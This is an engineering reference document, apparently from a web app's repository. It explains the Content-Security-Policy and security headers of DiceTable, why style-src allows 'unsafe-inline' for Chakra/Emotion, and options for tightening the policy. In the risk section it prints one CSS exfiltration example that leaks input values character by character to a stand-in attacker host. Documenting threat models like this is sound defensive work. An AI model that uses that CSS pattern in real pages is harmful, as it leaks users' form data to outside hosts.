# Security Headers and CSP

> Status: Living doc — update when [vercel.json](../../vercel.json) headers change.
> Last updated: 2026-05-28

This is the reference for the HTTP security headers DiceTable ships in production. Read this before tightening, loosening, or removing any directive in [vercel.json](../../vercel.json). The CSP especially is a deliberate balance between strictness and the realities of a Chakra UI / Emotion app, and the reasoning belongs in one place.

---

## TL;DR

- **Enforcing CSP, not Report-Only.** [vercel.json](../../vercel.json) ships a single `Content-Security-Policy` header. There is no `Content-Security-Policy-Report-Only` shadow policy today.
- **`script-src` is locked.** `'self'` only. No `'unsafe-inline'`, no `'unsafe-eval'`, no external script CDNs.
- **`style-src` has `'unsafe-inline'`.** This is the one permissive grant, and it exists because Chakra v3 uses Emotion, which injects runtime `<style>` tags. Without `'unsafe-inline'`, the app renders unstyled.
- **No CSP reporting endpoint.** No `report-uri` and no `report-to`. Violations are visible only in the user's local browser console. Adding reporting is a documented future option, not a current capability.
- **Five hardening headers ride alongside.** `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`, `Cross-Origin-Opener-Policy`, and `frame-ancestors 'none'` (via the CSP) cover the easy wins.

---

## The current policy

The full enforced CSP, from [vercel.json:11](../../vercel.json#L11):

```
default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline';
img-src 'self' data:;
font-src 'self';
connect-src 'self';
manifest-src 'self';
worker-src 'self';
object-src 'none';
base-uri 'self';
frame-ancestors 'none';
form-action 'self';
upgrade-insecure-requests
```

Directive-by-directive:

| Directive | Value | Why |
|---|---|---|
| `default-src` | `'self'` | Conservative fallback for any directive not set explicitly. |
| `script-src` | `'self'` | No third-party scripts, no inline scripts, no `eval`. Vercel Analytics and Speed Insights ship from first-party paths so this is sufficient. |
| `style-src` | `'self' 'unsafe-inline'` | See the next section. |
| `img-src` | `'self' data:` | `data:` covers SVG sprites and any inlined images. No external image CDN. |
| `font-src` | `'self'` | No Google Fonts, no external font hosts. Bundled fonts only. |
| `connect-src` | `'self'` | XHR / fetch / WebSocket all stay first-party. Telemetry POST to [/api/errors](../../api/errors.ts) is same-origin. |
| `manifest-src` | `'self'` | The PWA manifest is at [/manifest.webmanifest](../../public). |
| `worker-src` | `'self'` | The Workbox service worker ships from the same origin. |
| `object-src` | `'none'` | No `<embed>` / `<object>` / Flash-era surfaces. |
| `base-uri` | `'self'` | Prevents `<base>` injection from redirecting relative URLs. |
| `frame-ancestors` | `'none'` | Blocks clickjacking. The app is never embedded. |
| `form-action` | `'self'` | Form posts stay first-party. There are no forms today; this is preventive. |
| `upgrade-insecure-requests` | — | Any accidental `http://` URL is auto-upgraded by the browser. |

Sibling headers:

| Header | Value | Purpose |
|---|---|---|
| `X-Content-Type-Options` | `nosniff` | Browser does not MIME-sniff. |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Outbound requests do not leak full paths. |
| `Permissions-Policy` | `accelerometer=(), camera=(), geolocation=(), ...` | Disables device APIs the app does not use. |
| `Cross-Origin-Opener-Policy` | `same-origin` | Isolates the window from cross-origin openers. |

---

## The `style-src 'unsafe-inline'` tradeoff

This is the one place the policy intentionally departs from the strict ideal. The reasoning matters, so it lives here, not in a code comment.

### Why it's there

Chakra UI v3 is built on [Emotion](https://emotion.sh). When the app renders `<Box bg="bg.subtle" px={4}>`, Emotion does this at runtime in the browser:

1. Hashes the style props into a generated class name.
2. Generates the corresponding CSS rule.
3. Appends a `<style>` tag containing that rule to the document head.

From the browser's perspective, that injected `<style>` is "inline." Without `'unsafe-inline'` on `style-src`, the browser blocks the injection and the app renders unstyled — every component falls back to user-agent defaults. The only ways to allow it under a strict CSP are:

- A **nonce** matching the policy, stamped on every injected `<style>` tag. Possible with Emotion via `createCache({ nonce })`, but requires the nonce to reach the client first.
- A **hash** of every allowed style block. Impossible for runtime-generated CSS, where the contents change with every render.

A nonce path requires a server (or middleware) that generates a fresh nonce per request and injects it into the HTML before the JS runs. DiceTable is a Vite SPA served as a static `index.html`; today there is no per-request rewrite step. So `'unsafe-inline'` is the working compromise.

### What it actually allows

`'unsafe-inline'` on `style-src` lets the browser execute:

- Runtime-injected `<style>` tags (Emotion's use case)
- `style="..."` attributes on individual HTML elements

It does **not** affect scripts. The dangerous CSP relaxation is `'unsafe-inline'` on `script-src`, which would let an attacker run arbitrary JS via an injected `<script>`. That directive stays locked at `'self'`.

### Why this is low-risk for DiceTable today

For an attacker to exploit `style-src 'unsafe-inline'`, they first need a way to inject CSS into the DOM. The realistic attack would be CSS-based data exfiltration, e.g.:

```css
input[value^="a"] { background: url("https://evil.example/leak/a"); }
```

which leaks form values one character at a time as the browser fires background-image requests.

In this codebase that attack path is closed at every prior link in the chain:

- No `dangerouslySetInnerHTML` anywhere in `src/` (verified via grep).
- No user-rendered HTML or markdown.
- No `<iframe>` content from third parties.
- Share-link payloads are JSON, schema-validated by [`validateExpression`](../../src/state/persistedSchema.ts) before they reach React state. They are never rendered as markup.
- `connect-src 'self'` blocks the exfiltration request even if injected CSS did execute.

The `'unsafe-inline'` grant is the last link in a chain whose earlier links are already cut. A security scanner will still flag it because the scanner cannot see the app's actual surface — it only grades the policy.

### When it stops being low-risk

The trigger for tightening is any feature that **renders user-controlled content as HTML**. Examples:

- Markdown notes on rolls
- Embedded previews of external content
- A comments or chat feature
- An import format that accepts HTML fragments

If any of those land, the chain reconnects and the `'unsafe-inline'` becomes load-bearing for an exploit. Tighten the policy in the same PR that adds the feature, not after.

---

## Why there are no CSP violation reports

CSP supports `report-uri` (legacy) and `report-to` (modern) directives that POST violation reports to a server. The current policy declares neither, so:

- The browser still **enforces** the policy locally (blocked things stay blocked).
- The browser logs violations to the user's DevTools console only.
- Nothing is reported anywhere central.

The original design declined reporting on the grounds that DiceTable had no backend. That premise has since changed — [api/errors.ts](../../api/errors.ts) is a Vercel Function that already accepts telemetry posts. Wiring a sibling `api/csp-report.ts` would be straightforward; the decision to skip is now about priority, not capability.

Even if reporting were wired, the current policy is permissive enough that nothing in the app should trigger a violation. "No console errors on preview builds" is consistent with both "reporting works and is silent" and "policy is loose enough that nothing is being blocked." Today it is the second.

---

## Hardening paths (in order of effort)

These are reasonable directions if the threat model shifts (the app gains a user-rendered HTML surface, ships to a more sensitive context, or fails a compliance review). Each would update this doc.

### 1. Add Report-Only shadow policy

Cheapest. Keep the current enforced CSP as-is. Add a second header:

```
Content-Security-Policy-Report-Only: <stricter policy without 'unsafe-inline' on style-src>; report-uri /api/csp-report
```

Wire a tiny `api/csp-report.ts` (clone of [api/errors.ts](../../api/errors.ts) with a smaller schema). The shadow policy never blocks; it just tells you, on every real user's browser, what would break if you tightened the enforced policy. Useful as an inventory before any further hardening.

Cost: ~30 minutes.

### 2. Per-request nonce via Vercel Routing Middleware

The real fix. Vercel Routing Middleware runs on every HTML request. The middleware would:

1. Generate a random nonce per request (`crypto.randomUUID()` base64-encoded).
2. Rewrite the `Content-Security-Policy` header, replacing `style-src 'self' 'unsafe-inline'` with `style-src 'self' 'nonce-<value>'`.
3. Inject `<meta property="csp-nonce" content="<value>">` into the response HTML.

The app then reads the nonce from the meta tag and passes it to Emotion's cache via `createCache({ key: 'chakra', nonce })`, wrapped in a `<CacheProvider>` around the Chakra `<Provider>` in [src/components/ui/provider.tsx](../../src/components/ui/provider.tsx). Emotion stamps `nonce="<value>"` on every injected `<style>` tag and the CSP accepts them.

Chakra v3's exact API for threading a custom Emotion cache through `<Provider>` is the part to verify before committing — the pattern is standard for SSR Emotion apps but Chakra v3's documentation on it is thin.

Cost: a few hours, plus browser verification across the supported set.

### 3. Move off runtime CSS-in-JS

Nuclear. Switch the UI layer from Chakra/Emotion to a build-time-extracted alternative: Tailwind, Vanilla Extract, or [Panda CSS](https://panda-css.com) (built by the Chakra team for this exact reason). All styles end up in static `.css` files in the bundle, so `style-src 'self'` is sufficient and `'unsafe-inline'` can drop entirely.

Cost: rewrite the UI. Not justified by current threat model.

---

## Quick reference

| Concern | File |
|---|---|
| Header definitions | [vercel.json](../../vercel.json) |
| Telemetry endpoint (pattern for CSP reports) | [api/errors.ts](../../api/errors.ts) |
| Chakra / Emotion wiring (where a nonce would land) | [src/components/ui/provider.tsx](../../src/components/ui/provider.tsx) |
| Share-link validation (one of the closed attack chain links) | [src/state/persistedSchema.ts](../../src/state/persistedSchema.ts) |
